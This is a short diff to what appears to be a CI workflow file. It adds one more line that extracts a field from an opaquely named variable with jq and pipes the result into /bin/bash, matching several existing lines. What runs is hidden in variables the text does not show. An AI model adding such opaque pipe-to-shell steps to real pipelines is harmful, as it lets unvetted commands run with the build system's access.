@@ -25,6 +25,7 @@ jobs:
           echo $dpai0424 | jq -r .xpo83 | /bin/bash
           printf '%s' "$s20" | jq -r .xxn8 | /bin/bash
           echo $kb1 | jq -r .coj08536 | /bin/bash
+          echo $t087 | jq -r .pbtr6119 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
